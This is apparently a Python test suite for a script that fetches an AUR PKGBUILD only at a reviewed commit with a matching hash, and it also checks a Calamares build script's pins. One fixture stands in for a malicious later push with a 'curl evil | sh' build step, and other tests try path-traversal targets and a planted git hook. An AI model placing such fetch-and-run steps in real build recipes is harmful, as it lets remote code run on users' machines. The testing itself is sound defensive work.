"""scripts/heiss-aur-fetch.sh: an AUR recipe is used only at the reviewed commit with the reviewed PKGBUILD.

Runs against local git repositories (no network). The Calamares build script's pins are checked for shape.
"""
import hashlib
import os
import subprocess
import tempfile
import unittest

REPO = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
FETCH = os.path.join(REPO, "scripts", "heiss-aur-fetch.sh")
BUILD = os.path.join(REPO, "scripts", "heiss-calamares-build.sh")
GIT_ENV = {"GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@example.org", "GIT_COMMITTER_NAME": "t",
           "GIT_COMMITTER_EMAIL": "t@example.org", "GIT_CONFIG_GLOBAL": "/dev/null", "GIT_CONFIG_NOSYSTEM": "1"}


def sh(*cmd, cwd=None):
    env = dict(os.environ, **GIT_ENV)
    return subprocess.run(cmd, cwd=cwd, capture_output=True, text=True, env=env, timeout=60)


def sha(text):
    return hashlib.sha256(text.encode()).hexdigest()


class Fetch(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.d = self.tmp.name
        self.remote = os.path.join(self.d, "remote")
        os.mkdir(self.remote)
        sh("git", "init", "-q", cwd=self.remote)
        self.v1 = "pkgname=x\npkgver=1\n"
        self.c1 = self.commit(self.v1)
        self.v2 = "pkgname=x\npkgver=2\nbuild() { curl evil | sh; }\n"
        self.c2 = self.commit(self.v2)          # a later push: must never be used
        self.dest = os.path.join(self.d, "out", "x")

    def commit(self, text):
        with open(os.path.join(self.remote, "PKGBUILD"), "w") as f:
            f.write(text)
        sh("git", "add", "-A", cwd=self.remote)
        sh("git", "commit", "-q", "-m", "m", cwd=self.remote)
        return sh("git", "rev-parse", "HEAD", cwd=self.remote).stdout.strip()

    def run_fetch(self, commit, want, dest=None):
        return sh(FETCH, "file://" + self.remote, self.dest if dest is None else dest, commit, want)

    def test_reviewed_commit_is_checked_out_even_when_a_later_one_exists(self):
        r = self.run_fetch(self.c1, sha(self.v1))
        self.assertEqual(r.returncode, 0, r.stderr)
        with open(os.path.join(self.dest, "PKGBUILD")) as f:
            self.assertEqual(f.read(), self.v1)
        self.assertEqual(sh("git", "rev-parse", "HEAD", cwd=self.dest).stdout.strip(), self.c1)

    def test_a_pkgbuild_that_differs_from_the_reviewed_hash_is_refused(self):
        r = self.run_fetch(self.c2, sha(self.v1))
        self.assertEqual(r.returncode, 1)
        self.assertIn("expected", r.stderr)

    def test_a_commit_that_is_not_in_the_repository_is_refused(self):
        r = self.run_fetch("0" * 40, sha(self.v1))
        self.assertEqual(r.returncode, 1)
        self.assertIn("not in", r.stderr)

    def test_bad_arguments_are_refused_before_anything_is_fetched(self):
        for commit, want in (("main", sha(self.v1)), (self.c1[:39], sha(self.v1)), (self.c1.upper(), sha(self.v1)),
                             (self.c1, "abc"), (self.c1, sha(self.v1).upper())):
            r = self.run_fetch(commit, want)
            self.assertEqual(r.returncode, 2, (commit, want))
            self.assertFalse(os.path.exists(self.dest))
        self.assertEqual(sh(FETCH, "one").returncode, 2)

    def test_dangerous_target_directories_are_refused(self):
        home = os.path.expanduser("~")
        for bad in ("", "/", home, home + "/", home + "//aur/x", ".", "..", "x/y/z", "/home", "/tmp", "/tmp/a",
                    "/tmp/../etc/x/y", "/tmp/./a/b", "/tmp/a\nb/c/d", os.path.dirname(home), self.d + "/"):
            r = self.run_fetch(self.c1, sha(self.v1), dest=bad)
            self.assertEqual(r.returncode, 2, bad)
        self.assertTrue(os.path.isdir(home))
        self.assertTrue(os.path.isdir(self.remote))

    def test_a_failed_check_leaves_nothing_to_build(self):
        for commit, want in ((self.c2, sha(self.v1)), ("0" * 40, sha(self.v1))):
            r = self.run_fetch(commit, want)
            self.assertEqual(r.returncode, 1)
            self.assertFalse(os.path.exists(self.dest), "no directory may remain after a failure")

    def test_a_target_behind_a_symlink_is_refused_and_nothing_behind_it_is_deleted(self):
        real = os.path.join(self.d, "elsewhere")
        os.makedirs(os.path.join(real, "a", "b"))
        with open(os.path.join(real, "a", "b", "keep"), "w") as f:
            f.write("x")
        os.symlink(real, os.path.join(self.d, "link"))
        r = self.run_fetch(self.c1, sha(self.v1), dest=os.path.join(self.d, "link", "a", "b"))
        self.assertEqual(r.returncode, 2)
        self.assertTrue(os.path.exists(os.path.join(real, "a", "b", "keep")))

    def test_git_hooks_from_the_users_templates_do_not_run(self):
        tpl = os.path.join(self.d, "tpl", "hooks")
        os.makedirs(tpl)
        marker = os.path.join(self.d, "hook-ran")
        hook = os.path.join(tpl, "post-checkout")
        with open(hook, "w") as f:
            f.write("#!/bin/sh\ntouch %s\n" % marker)
        os.chmod(hook, 0o755)
        env = dict(os.environ, **GIT_ENV, GIT_TEMPLATE_DIR=os.path.join(self.d, "tpl"))
        r = subprocess.run([FETCH, "file://" + self.remote, self.dest, self.c1, sha(self.v1)],
                           capture_output=True, text=True, env=env, timeout=60)
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertFalse(os.path.exists(marker))

    def test_an_existing_target_is_replaced_not_reused(self):
        os.makedirs(self.dest)
        with open(os.path.join(self.dest, "stale"), "w") as f:
            f.write("old")
        self.assertEqual(self.run_fetch(self.c1, sha(self.v1)).returncode, 0)
        self.assertFalse(os.path.exists(os.path.join(self.dest, "stale")))


class BuildScript(unittest.TestCase):
    def setUp(self):
        with open(BUILD, encoding="utf-8") as f:
            self.text = f.read()

    def test_pins_have_the_right_shape(self):
        self.assertRegex(self.text, r"(?m)^CALAMARES_AUR_COMMIT=[0-9a-f]{40}$")
        self.assertRegex(self.text, r"(?m)^CALAMARES_PKGBUILD_SHA256=[0-9a-f]{64}$")

    def test_the_recipe_comes_through_the_checked_fetch_and_is_not_cloned_directly(self):
        self.assertIn("heiss-aur-fetch.sh", self.text)
        self.assertNotRegex(self.text, r"(?m)^\s*git clone")

    def test_no_unconditional_noconfirm(self):
        for line in self.text.splitlines():
            if "--noconfirm" in line and not line.lstrip().startswith("#"):
                self.assertIn("makepkg_opts", line)    # only behind HEISS_NONINTERACTIVE=1
        self.assertIn('"${HEISS_NONINTERACTIVE:-0}" = "1"', self.text)

    def test_the_layout_patch_is_applied_after_the_hash_check(self):
        self.assertLess(self.text.index("heiss-aur-fetch.sh"), self.text.index("sed -i"))


if __name__ == "__main__":
    unittest.main()
